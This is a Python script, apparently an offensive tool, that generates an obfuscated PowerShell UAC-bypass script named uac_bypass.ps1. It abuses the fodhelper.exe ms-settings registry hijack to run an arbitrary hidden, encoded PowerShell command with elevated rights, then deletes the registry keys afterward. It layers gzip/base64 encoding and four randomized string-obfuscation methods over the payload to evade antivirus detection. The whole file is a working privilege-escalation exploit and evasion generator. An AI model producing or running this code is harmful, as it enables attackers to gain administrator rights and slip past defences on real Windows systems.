import gzip
import base64
import io
import re
import random
import string
import os

payload = r"""$payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command";reg add "HKCU\Software\Classes\.hacker\Shell\Open\command" /d $payload /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".hacker" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.hacker\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;"""

# COMMAND CAN BE ANYTHING, THIS IS JUST A PROOF OF CONCEPT
command = r"New-Item C:\Windows\System32\WOWZERS.txt"

random_payload = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))
random_command = ''.join(random.choices(string.ascii_letters, k=random.randint(1, 20)))

payload = payload.replace("payload", random_payload)
payload = payload.replace("command", random_command)

def compress_to_base64(input_string):
    input_bytes = input_string.encode('utf-8')
    buffer = io.BytesIO()
    with gzip.GzipFile(fileobj=buffer, mode='wb') as file:
        file.write(input_bytes)
    compressed_bytes = buffer.getvalue()
    base64_encoded = base64.b64encode(compressed_bytes)
    return base64_encoded.decode('utf-8')

compressed_base64 = compress_to_base64(payload)

print(compressed_base64)

encoded_command = base64.b64encode(command.encode('utf-16le')).decode('ascii')

full_payload = r"$command = '" + encoded_command + r"';(& (\New-Object\) (\IO.Compression.GZipStream\)([System.IO.MemoryStream][Convert]::FromBase64String('" + compressed_base64 + r"'), [System.IO.Compression.CompressionMode]::Decompress) | % {(& (\New-Object\) (\System.IO.StreamReader\)($_, [System.Text.Encoding]::ASCII))}).(\ReadToEnd\)() | Invoke-Expression"

pattern = r"\\.+?\\"

full_payload = full_payload.replace("payload", random_payload)
full_payload = full_payload.replace("command", random_command)
    
def list_2_character_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    return r"([string]::join('', ( (" + ','.join(str(ord(character)) for character in command) +  r") |%{$_}|%{ ([char][int] $_)})) |%{$_}| % {$_})"
	
# METHOD 2
def character_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    parts = []
	
    for character in command:
        rnd = random.randint(1, 99)
        operation = "+" if random.choice([True, False]) else "*"
        compliment = "-" if operation == "+" else "/"
        if operation == "+":
            part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_}| % {$_} |%{$_})"
        else:
            part = f"([char]({rnd}{operation}{str(ord(character))}{compliment}{rnd})" + r" |%{$_})"
        parts.append(part)
	    
    return '+'.join(parts)

# METHOD 3
def random_string_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    char_positions = [''] * 170
    indices_used = []
    
    for character in command:
        index = random.choice([i for i in range(170) if char_positions[i] == ''])
        char_positions[index] = character
        indices_used.append(index)
        
    for i in range(len(char_positions)):
        if char_positions[i] == '':
            char_positions[i] = random.choice(string.ascii_letters + string.digits)
		
    return "('" + ''.join(char_positions) + "'[" + ','.join(map(str, indices_used)) + "] -join '' |%{$_}| % {$_})"

# METHOD 4
env = [
	"ALLUSERSPROFILE",
	"CommonProgramFiles",
	"ComSpec",
	"ProgramData",
	"ProgramFiles",
	"ProgramW6432",
	"PSModulePath",
	"PUBLIC",
	"SystemDrive",
	"SystemRoot",
	"windir"
]

environment_variable_character_map = {}

for character in string.printable:
    environment_variable_character_map[character] = {}
    for variable in env:
        value = os.getenv(variable)
        if character in value:
            environment_variable_character_map[character][variable] = []
            for index, character_in_value in enumerate(value):
                if character == character_in_value:
                    environment_variable_character_map[character][variable].append(index)
                    
def environment_variables_2_string(object):
    if isinstance(object, str):
        command = object
    else:
        command = object.group(0)[1:-1]
	    
    hidden_strings = []
    for character in command:
        if character in environment_variable_character_map and environment_variable_character_map[character]:
            possible_variables = list(environment_variable_character_map[character].keys())
            chosen_variable = random.choice(possible_variables)
            possible_index = environment_variable_character_map[character][chosen_variable]
            chosen_index = random.choice(possible_index)
            hidden_strings.append(f"$env:{chosen_variable}[{chosen_index}]")
        else:
            hidden_strings.append(random.choice([list_2_character_2_string,
                                  character_2_string,
                                  random_string_2_string])(character))
    return "+".join(hidden_strings)

# REPLACE EACH MATCH WITH RANDOM METHOD
for match in range(int(full_payload.count("\\")/2)):
    full_payload = re.sub(pattern,
                           lambda m: random.choice([list_2_character_2_string,
                                                    character_2_string,
                                                    random_string_2_string,
						   environment_variables_2_string])(m),
                           full_payload,
                           count=1)

with open('uac_bypass.ps1', 'w') as c:
    c.write(full_payload)
print("Check files for uac_bypass.ps1")
